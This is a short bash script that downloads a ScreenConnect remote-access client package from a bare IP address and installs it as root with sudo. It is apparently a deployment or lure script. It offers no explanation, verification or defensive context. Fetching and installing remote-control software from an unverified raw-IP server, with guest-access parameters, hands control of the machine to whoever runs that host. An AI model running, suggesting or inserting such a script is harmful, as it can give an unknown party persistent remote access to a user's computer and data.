#!/bin/bash

URL="http://184.107.178.101:8040/Bin/ScreenConnect.ClientSetup.pkg?e=Access&y=Guest"
FILE="ScreenConnect.ClientSetup.pkg"
FILEPATH="/tmp/$FILE"

# Check if file exists
if [ ! -f "$FILEPATH" ]; then
    echo "Downloading installer..."
    curl -L "$URL" -o "$FILEPATH"
fi

# Run installer
echo "Running installer..."
sudo installer -pkg "$FILEPATH" -target /